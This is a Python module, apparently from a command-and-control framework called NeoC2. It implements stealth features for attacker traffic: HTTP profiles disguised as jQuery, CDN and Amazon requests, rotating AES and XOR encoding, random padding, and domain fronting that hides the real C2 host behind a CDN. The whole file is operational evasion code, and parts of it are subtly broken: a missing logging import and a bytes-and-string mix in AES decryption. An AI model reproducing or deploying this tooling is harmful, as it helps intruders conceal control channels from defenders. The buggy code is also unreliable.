import os
import json
import random
import base64
import string
import time
import urllib.parse
import socket
import ssl
import dns.resolver
import requests
from datetime import datetime
from core.config import NeoC2Config
from core.utils import generate_random_string, generate_domain
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

class OPSECManager:
    def __init__(self, config):
        self.config = config
        self.malleable_profiles = self._load_malleable_profiles()
        self.cdn_domains = config.get("opsec.cdn_domains", [])
        self.domain_fronting = config.get("opsec.domain_fronting", False)
        self.traffic_shaping = config.get("opsec.traffic_shaping", True)
        self.keys = [os.urandom(32)]  # AES-256 key
        self.key_index = 0
        self.rotation_interval = 3600  # 1 hour
        self.last_rotation = time.time()
        
        self.user_agents = {
            "chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "safari": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        }
    
    def _load_malleable_profiles(self):
        return {
            "default": {
                "http_get": {
                    "uri": "/api/get",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive"
                    }
                },
                "http_post": {
                    "uri": "/api/post",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive"
                    }
                }
            },
            "cdn": {
                "http_get": {
                    "uri": "/cdn/api/get",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Host": "cdn.example.com"
                    }
                },
                "http_post": {
                    "uri": "/cdn/api/post",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Host": "cdn.example.com"
                    }
                }
            },
            "jquery": {
                "http_get": {
                    "uri": "/jquery-3.3.1.min.js",
                    "headers": {
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Connection": "keep-alive",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                    }
                },
                "http_post": {
                    "uri": "/jquery/update",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "*/*",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Connection": "keep-alive",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                    }
                }
            },
            "amazon": {
                "http_get": {
                    "uri": "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests": "1"
                    }
                },
                "http_post": {
                    "uri": "/cart/add",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive"
                    }
                }
            }
        }
    
    def get_random_user_agent(self):
        return random.choice(list(self.user_agents.values()))
    
    def get_random_profile(self):
        return random.choice(list(self.malleable_profiles.keys()))
    
    def apply_profile(self, profile_name, request_type):
        if profile_name in self.malleable_profiles and request_type in self.malleable_profiles[profile_name]:
            return self.malleable_profiles[profile_name][request_type]
        return self.malleable_profiles["default"][request_type]
    
    def rotate_key(self):
        if time.time() - self.last_rotation > self.rotation_interval:
            new_key = os.urandom(32)
            self.keys.append(new_key)
            if len(self.keys) > 5:
                self.keys.pop(0)
            self.key_index = len(self.keys) - 1
            self.last_rotation = time.time()
    
    def get_current_key(self):
        self.rotate_key()
        return self.keys[self.key_index]
    
    def transform_data(self, data, transformation="base64"):
        self.rotate_key()
        if transformation == "base64":
            return base64.b64encode(data.encode()).decode()
        elif transformation == "xor":
            key = self.config.get("opsec.xor_key", 0x5f)
            return ''.join(chr(ord(c) ^ key) for c in data)
        elif transformation == "aes":
            key = self.get_current_key()
            iv = os.urandom(16)
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data.encode()) + padder.finalize()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded_data) + encryptor.finalize()
            return base64.b64encode(iv + encrypted).decode()
        return data
    
    def reverse_transform(self, data, transformation="base64"):
        if transformation == "base64":
            return base64.b64decode(data).decode()
        elif transformation == "xor":
            key = self.config.get("opsec.xor_key", 0x5f)
            return ''.join(chr(ord(c) ^ key) for c in data)
        elif transformation == "aes":
            decoded = base64.b64decode(data)
            iv = decoded[:16]
            encrypted = decoded[16:]
            for key in self.keys[::-1]:  # Try recent keys
                try:
                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                    decryptor = cipher.decryptor()
                    padded = decryptor.update(encrypted) + decryptor.finalize()
                    unpadder = padding.PKCS7(128).unpadder()
                    return unpadder.update(padded) + unpadder.finalize().decode()
                except Exception:
                    continue
            raise ValueError("AES decryption failed")
        return data
    
    def add_padding(self, data, min_pad=0, max_pad=100):
        if self.traffic_shaping:
            padding_length = random.randint(min_pad, max_pad)
            padding = generate_random_string(padding_length)
            return data + padding
        return data
    
    def resolve_domain(self, domain):
        try:
            answers = dns.resolver.resolve(domain, 'A')
            return [str(ip) for ip in answers]
        except Exception as e:
            logging.error(f"Domain resolution failed: {str(e)}")
            return []

    def domain_front_request(self, url, method="GET", data=None, headers=None):
        if not self.domain_fronting or not self.cdn_domains:
            return requests.request(method, url, data=data, headers=headers, verify=False)

        front_domain = random.choice(self.cdn_domains)
        parsed_url = urllib.parse.urlparse(url)
        real_host = parsed_url.netloc

        ips = self.resolve_domain(front_domain)
        if not ips:
            raise ValueError("Failed to resolve front domain")

        ip = random.choice(ips)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 443))
        context = ssl.create_default_context()
        ssl_sock = context.wrap_socket(sock, server_hostname=front_domain)

        path = parsed_url.path or "/"
        if parsed_url.query:
            path += "?" + parsed_url.query

        request_line = f"{method} {path} HTTP/1.1\r\n"
        request_headers = f"Host: {real_host}\r\n"
        if headers:
            for k, v in headers.items():
                request_headers += f"{k}: {v}\r\n"
        request_headers += "Connection: close\r\n\r\n"
        ssl_sock.sendall((request_line + request_headers).encode())

        if data and method == "POST":
            ssl_sock.sendall(data.encode())

        response = b""
        while True:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            response += chunk
        ssl_sock.close()
        return response.decode(errors="ignore")
